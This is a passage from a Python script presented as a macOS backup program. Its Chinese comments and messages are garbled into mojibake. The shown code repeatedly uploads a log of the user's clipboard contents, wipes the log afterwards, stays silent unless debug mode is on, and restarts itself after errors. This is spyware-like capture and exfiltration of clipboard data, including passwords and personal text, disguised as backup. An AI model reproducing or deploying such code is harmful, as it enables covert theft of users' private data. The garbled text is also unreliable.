                        # æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰å®é™…è®°å½•
                        if backup_manager.has_clipboard_content(clipboard_log_path):
                            # åˆ›å»ºä¸´æ—¶æ–‡ä»¶
                            temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'clipboard')
                            if backup_manager._ensure_directory(temp_dir):
                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                temp_file = os.path.join(temp_dir, f"{user_prefix}_clipboard_{timestamp}.txt")
                                
                                try:
                                    # å¤åˆ¶æ—¥å¿—å†…å®¹åˆ°ä¸´æ—¶æ–‡ä»¶
                                    shutil.copy2(clipboard_log_path, temp_file)
                                    
                                    # ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶
                                    if backup_manager.upload_file(temp_file):
                                        # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶
                                        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                            f.write(f"=== ğŸ“‹ JTBæ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                                        last_upload_time = current_time
                                        if backup_manager.config.DEBUG_MODE:
                                            logging.info("ğŸ“¤ JTBæ—¥å¿—ä¸Šä¼ æˆåŠŸ")
                                except Exception as e:
                                    if backup_manager.config.DEBUG_MODE:
                                        logging.error(f"âŒ JTBæ—¥å¿—ä¸Šä¼ å¤±è´¥: {e}")
                                finally:
                                    # æ¸…ç†ä¸´æ—¶ç›®å½•
                                    try:
                                        if os.path.exists(temp_dir):
                                            shutil.rmtree(temp_dir)
                                    except Exception:
                                        pass
                        else:
                            # æ–‡ä»¶æ²¡æœ‰å®é™…å†…å®¹ï¼Œæ¸…ç©ºæ–‡ä»¶å¹¶é‡ç½®ä¸Šä¼ æ—¶é—´
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("ğŸ“‹ JTBæ–‡ä»¶æ— å®é™…å†…å®¹ï¼Œè·³è¿‡ä¸Šä¼ ")
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== ğŸ“‹ JTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                            last_upload_time = current_time
                
            # å®šæœŸæ£€æŸ¥
            time.sleep(backup_manager.config.CLIPBOARD_UPLOAD_CHECK_INTERVAL)
            
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"JTBä¸Šä¼ çº¿ç¨‹é”™è¯¯: {e}")
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def main():
    """ä¸»å‡½æ•°"""
    pid_file = os.path.join(BackupConfig.BACKUP_ROOT, 'backup.pid')
    try:
        # æ£€æŸ¥æ˜¯å¦å·²ç»æœ‰å®ä¾‹åœ¨è¿è¡Œ
        if os.path.exists(pid_file):
            with open(pid_file, 'r') as f:
                old_pid = int(f.read().strip())
                try:
                    os.kill(old_pid, 0)
                    print(f'å¤‡ä»½ç¨‹åºå·²ç»åœ¨è¿è¡Œ (PID: {old_pid})')
                    return
                except OSError:
                    pass
        
        # å†™å…¥å½“å‰è¿›ç¨‹PID
        os.makedirs(os.path.dirname(pid_file), exist_ok=True)
        with open(pid_file, 'w') as f:
            f.write(str(os.getpid()))
            
        # æ³¨æ„ï¼šæ—¥å¿—é…ç½®åœ¨ BackupManager.__init__ ä¸­è¿›è¡Œï¼Œæ— éœ€é‡å¤é…ç½®
        
        # æ£€æŸ¥ç£ç›˜ç©ºé—´
        try:
            # åœ¨ macOS ä¸Šç›´æ¥ä½¿ç”¨å¤‡ä»½æ ¹ç›®å½•
            free_space = shutil.disk_usage(BackupConfig.BACKUP_ROOT).free
            if free_space < BackupConfig.MIN_FREE_SPACE:
                logging.warning(f'å¤‡ä»½é©±åŠ¨å™¨ç©ºé—´ä¸è¶³: {free_space / (1024*1024*1024):.2f}GB')
        except Exception as e:
            logging.warning(f'æ— æ³•æ£€æŸ¥ç£ç›˜ç©ºé—´: {e}')
        
        # åˆ›å»ºå¤‡ä»½ç®¡ç†å™¨å®ä¾‹
        backup_manager = BackupManager()
        
        # æ¸…ç†æ—§çš„å¤‡ä»½ç›®å½•
        clean_backup_directory()
        
        # å¯åŠ¨å®šæœŸå¤‡ä»½å’Œä¸Šä¼ 
        periodic_backup_upload(backup_manager)
            
    except KeyboardInterrupt:
        logging.info('å¤‡ä»½ç¨‹åºè¢«ç”¨æˆ·ä¸­æ–­')
    except Exception as e:
        logging.error(f'å¤‡ä»½è¿‡ç¨‹å‘ç”Ÿé”™è¯¯: {str(e)}')
        # å‘ç”Ÿé”™è¯¯æ—¶ç­‰å¾…ä¸€æ®µæ—¶é—´åé‡è¯•
        time.sleep(BackupConfig.MAIN_ERROR_RETRY_DELAY)
        main()  # é‡æ–°å¯åŠ¨ä¸»ç¨‹åº
    finally:
        # æ¸…ç†PIDæ–‡ä»¶
        try:
            if os.path.exists(pid_file):
                os.remove(pid_file)
        except Exception as e:
            logging.error(f'æ¸…ç†PIDæ–‡ä»¶å¤±è´¥: {str(e)}')

if __name__ == "__main__":
    main()
